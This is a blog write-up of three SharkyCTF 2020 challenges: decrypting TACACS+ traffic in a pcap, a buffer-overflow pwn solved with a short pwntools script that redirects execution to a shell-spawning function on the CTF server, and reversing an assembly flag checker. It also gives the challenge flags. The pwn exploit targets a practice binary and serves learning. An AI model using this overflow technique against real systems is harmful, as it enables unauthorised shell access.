---
setup: |
  import Layout from '../../../layouts/BlogPostLayout.astro';
title: Sharky 2020 CTF writeup
date: 2020-05-10
description: CTF writeup
author: "Gold Ayan"
category: "CTF"
tags:
  - ctf
  - writeup
---

SharkyCTF writeup

## Networking - RattataTACACS

- Challenge contains pcap file which contains tacacs+ encrypted packet which we need to decrypt to get the flag.
- The udp packets followed by tacacs contains the authentication details of user logged on to the cisco router.

<!-- more -->

![sharkyctf-2020-udpstreamflow](/image/sharky-ctf-2020/udpStreamFlowChase.png)

- Authentication details are encrypted so i decrypted the type 7 password using the webite to obtain the **Decryption key**

![sharkyctf-2020-imagedecrypt](/image/sharky-ctf-2020/ImageDecryption.png)

- Applying the decryption key for tacacs to wireshark to decrypt the packet (Perference -> Protocols -> Tacacs+).

![sharkyctf-2020-tacacs](/image/sharky-ctf-2020/tacacsDecryption.png)

- checking the encrypted packet we can get the flag

```
shkCTF{T4c4c5_ch4ll3n63_br0}
```

## Pwn - Give away 0

- Challenge contains a ELF 64 bit binary.
- statically analyzing binary help me to find it has **win** which executes /bin/sh (shell) so all we need to do is redirect the code to win function.
- Binary contains Buffer overflow vulnerability in vuln function so we are going to overflow the buffer and points the _instruction pointer_ to win function.
- shell code written using _pwntools_.

```python

from pwn import \*
vuln=ELF('./0_give_away')

conn=remote('sharkyctf.xyz',20333)
conn.sendline(("A"\*40).encode()+p64(vuln.symbols['win_func']))
conn.interactive()

```

- Run the code and **cat flag.txt** in the server.

```

shkCTF{#Fr33*fL4g!!*<3}

```

**Note**: When you are writting shell code in python3 remember to convert the string to bytes inorder to combine JUNK + ADDR

## Reverse - Simple

- Challenge contains asm file.

```asm
BITS 64

SECTION .rodata
	some_array db 10,2,30,15,3,7,4,2,1,24,5,11,24,4,14,13,5,6,19,20,23,9,10,2,30,15,3,7,4,2,1,24
	the_second_array db 0x57,0x40,0xa3,0x78,0x7d,0x67,0x55,0x40,0x1e,0xae,0x5b,0x11,0x5d,0x40,0xaa,0x17,0x58,0x4f,0x7e,0x4d,0x4e,0x42,0x5d,0x51,0x57,0x5f,0x5f,0x12,0x1d,0x5a,0x4f,0xbf
	len_second_array equ $ - the_second_array
SECTION .text
    GLOBAL main

main:
	mov rdx, [rsp]
	cmp rdx, 2 # two arguments
	jne exit
	mov rsi, [rsp+0x10] # get the first argument
	mov rdx, rsi
	mov rcx, 0
l1:
	cmp byte [rdx], 0 # Strlen function, the length is stored in rcx
	je follow_the_label
	inc rcx
	inc rdx
	jmp l1
follow_the_label: # Array are compard from last to first
	mov al, byte [rsi+rcx-1] # rsi contains the input value
	mov rdi,  some_array
	mov rdi, [rdi+rcx-1] # get the particular value of some_array to rdi
	add al, dil  # dil -> lower 8 bit of rdi, add it the al register
	xor rax, 42
	mov r10, the_second_array
	add r10, rcx
	dec r10
	cmp al, byte [r10]
	jne exit
	dec rcx
	cmp rcx, 0
	jne follow_the_label
win:#Return 0 function
	mov rdi, 1
	mov rax, 60
	syscall
exit:
	mov rdi, 0
	mov rax, 60
	syscall

```

- we need to find the input so that this program will return 1.
- The above program gets input string and compare it with the second_array.
- Before comparing, the value in input are added with some array and XORed with 42(0x2a in hex).
- I have written python program to do the above thing in reverse to obtain the input which is the flag.
- Included all the reference material that i used to solve the challenge are linked below in Resources section.
- Solution

```python
  sub_array=[10,2,30,15,3,7,4,2,1,24,5,11,24,4,14,13,5,6,19,20,23,9,10,2,30,15,3,7,4,2,1,24]
  encode_array=[0x57,0x40,0xa3,0x78,0x7d,0x67,0x55,0x40,0x1e,0xae,0x5b,0x11,0x5d,0x40,0xaa,0x17,0x58,0x4f,0x7e,0x4d,0x4e,0x42,0x5d,0x51,0x57,0x5f,0x5f,0x12,0x1d,0x5a,0x4f,0xbf]

for i in range(len(sub_array)):
xored_value = encode_array[i] ^ 0x2a
final_value = xored_value - sub_array[i]
print(chr(final_value),end='')

```

- Flag obtained

```

shkCTF{h3ll0_fr0m_ASM_my_fr13nd}

```

## Resources:

### Reference for tacacs

- (How to decrypt tacacs using wireshark)[https://www.youtube.com/watch?v=eaasnPU9IaA]

### Materials used for reversing simple

1)https://stackoverflow.com/questions/1753602/what-are-the-names-of-the-new-x86-64-processors-registers

```

# 64-bit register | Lower 32 bits | Lower 16 bits | Lower 8 bits

rax | eax | ax | al
rbx | ebx | bx | bl
rcx | ecx | cx | cl
rdx | edx | dx | dl
rsi | esi | si | sil
rdi | edi | di | dil
rbp | ebp | bp | bpl
rsp | esp | sp | spl
r8 | r8d | r8w | r8b
r9 | r9d | r9w | r9b
r10 | r10d | r10w | r10b
r11 | r11d | r11w | r11b
r12 | r12d | r12w | r12b
r13 | r13d | r13w | r13b
r14 | r14d | r14w | r14b
r15 | r15d | r15w | r15b

```

2)https://stackoverflow.com/questions/30528091/whats-the-asm-equivalent-of-replacing-a-char-from-a-string-to-a-char-of-another

```asm

section .text
global \_ft_strcat

\_ft_strcat:
mov rax, rdi
mov rbx, rsi

loop_s1:
cmp byte[rax], 0
jz copy_str
inc rax
jmp loop_s1

copy_str: #( Helped me to solve simple )
cmp byte[rbx], 0
jz end
mov byte[rax], byte[rbx]
inc rax
inc rbx
jmp copy_str

end:
mov byte[rax], 0
ret

```

### Materials used for shellcoding

- [Possible way to send string to stack x86](https://illegalbytes.com/2018-02-25/two-ways-to-pass-data-to-your-shellcode/)
- [String Encoding in Python for shellcoding](https://gist.github.com/offlinemark/5be8375ba28d5b7dd2d0)
- [x86 cheatsheet](https://www.bencode.net/blob/nasmcheatsheet.pdf)
- [Intel reference](https://software.intel.com/content/www/us/en/develop/articles/introduction-to-x64-assembly.html)
